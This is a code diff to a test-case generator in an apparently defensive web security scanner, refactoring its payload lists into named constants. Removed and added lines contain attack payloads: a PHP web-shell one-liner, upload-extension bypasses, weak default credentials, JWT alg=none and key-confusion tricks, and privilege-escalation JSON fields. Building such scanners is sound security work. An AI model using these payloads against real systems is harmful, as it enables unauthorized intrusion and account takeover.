@@ -794,7 +794,7 @@ def generate_test_cases(profile: EndpointProfile) -> list[TestCase]:
             title="Authentication — Rate Limiting / Account Lockout",
             description="Login endpoints without rate-limiting or lockout policies allow brute-force attacks.",
             parameters=list(profile.all_params)[:3],
-            payloads=["admin:admin", "admin:password", "admin:123456", "test:test", "root:root"],
+            payloads=[f"{u}:{p}" for u, p in WEAK_CREDENTIAL_PAIRS[:12]],
             severity="high", priority=8,
             cwe="CWE-307", owasp="A07:2021 - Identification and Authentication Failures",
             rationale=f"Authentication endpoint detected at {profile.path}.",
@@ -840,14 +840,10 @@ def generate_test_cases(profile: EndpointProfile) -> list[TestCase]:
             title="Unrestricted File Upload",
             description="File upload endpoints may accept dangerous file types (PHP, JSP) or allow path traversal in filenames.",
             parameters=["file", "upload", "attachment"],
-            payloads=[
-                "shell.php  →  <?php system($_GET['cmd']); ?>",
-                "shell.php%00.jpg",
-                "shell.PHP",
-                "shell.php.jpg",
-                "shell.phtml",
-                "<svg><script>alert(1)</script></svg> as .svg",
-            ],
+            payloads=(
+                [f"shell{ext}  →  <?php system($_GET['cmd']); ?>" for ext in FILE_UPLOAD_BYPASS_EXTENSIONS[:6]]
+                + FILE_UPLOAD_MALICIOUS_CONTENT[:3]
+            ),
             severity="critical", priority=10,
             cwe="CWE-434", owasp="A04:2021 - Insecure Design",
             rationale=f"File upload endpoint or multipart/form-data request detected at {profile.path}.",
@@ -893,12 +889,11 @@ def generate_test_cases(profile: EndpointProfile) -> list[TestCase]:
             title='JWT — Algorithm Confusion / "none" / Weak Secret',
             description="JWTs are commonly misconfigured: accepting alg=none, using weak HMAC secrets, or RS256→HS256 algorithm confusion.",
             parameters=["Authorization"],
-            payloads=[
-                '{"alg":"none"} — strip signature entirely',
-                '{"alg":"HS256"} + sign with RS256 public key as HMAC secret',
-                "Weak secrets: secret, password, 123456, changeme, jwt_secret",
-                "Modify sub/role/admin claim, keep or remove signature",
-            ],
+            payloads=(
+                [f'alg="{v}" — strip/downgrade algorithm' for v in JWT_ALG_NONE_VARIANTS[:4]]
+                + [f"Weak secret: {s}" for s in JWT_WEAK_SECRETS[:4]]
+                + [f"kid injection: {k}" for k in JWT_KID_PAYLOADS[:2]]
+            ),
             severity="high", priority=8,
             cwe="CWE-347", owasp="A02:2021 - Cryptographic Failures",
             rationale="JWT Bearer authentication detected on this endpoint.",
@@ -922,7 +917,10 @@ def generate_test_cases(profile: EndpointProfile) -> list[TestCase]:
             title="Cross-Site Request Forgery (CSRF)",
             description="State-changing requests without CSRF tokens or SameSite cookies can be triggered cross-origin.",
             parameters=[],
-            payloads=[f"<form method='{profile.method}' action='{profile.full_url}'><input type='submit'></form>"],
+            payloads=(
+                [f"<form method='{profile.method}' action='{profile.full_url}'><input type='submit'></form>"]
+                + [f"Bypass header: {h}" for h in CSRF_BYPASS_HEADERS[:4]]
+            ),
             severity="medium", priority=6,
             cwe="CWE-352", owasp="A01:2021 - Broken Access Control",
             rationale=f"{profile.method} {profile.path} is state-changing. No CSRF token detected in parameters.",
@@ -945,14 +943,7 @@ def generate_test_cases(profile: EndpointProfile) -> list[TestCase]:
             title="Mass Assignment / Unauthorised Parameter Binding",
             description="JSON APIs that don't whitelist fields may accept extra keys like role, admin, or verified, escalating privileges.",
             parameters=list(profile.all_params)[:5],
-            payloads=[
-                '{"role": "admin"}',
-                '{"is_admin": true}',
-                '{"verified": true}',
-                '{"account_type": "premium"}',
-                '{"credits": 99999}',
-                '{"subscription_tier": "enterprise"}',
-            ],
+            payloads=[f'{{"{f}": "admin"}}' for f in MASS_ASSIGNMENT_ROLE_FIELDS[:8]],
             severity="high", priority=7,
             cwe="CWE-915", owasp="A01:2021 - Broken Access Control",
             rationale=f"JSON body at {profile.method} {profile.path}. Extra keys may be bound by the framework.",
